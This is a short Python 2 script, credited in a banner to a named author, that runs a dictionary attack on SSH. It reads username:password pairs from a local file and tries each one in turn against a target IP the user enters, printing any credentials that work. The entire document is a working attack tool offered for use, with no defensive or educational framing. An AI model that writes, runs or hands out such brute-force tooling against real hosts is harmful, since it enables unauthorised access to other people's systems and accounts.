import paramiko
import sys

print '\t\t\t ######################################'
print '\t\t\t ##    Proudly Made By An INDIAN     ##'
print '\t\t\t ##   Author : Rohit Saxsena INDIA   ##'
print '\t\t\t ##     Version : V0.1               ##'
print '\t\t\t ######################################'

def attack(host, dictionary):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    p = open(dictionary,'r')
    for line in p.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip()
        print "[+] Trying " +userName +":" + passWord
        try:
            ssh.connect(host,username=userName,password=passWord)
            print '[!] %s:%s Success!' % (userName, passWord)
            ssh.close()
        
        except paramiko.AuthenticationException:
             pass
	
    print "[-]Could not found"
    
host = raw_input("Enter target IP:")
dictionary = "UserAndPass.txt"
attack(host, dictionary)            
         
             
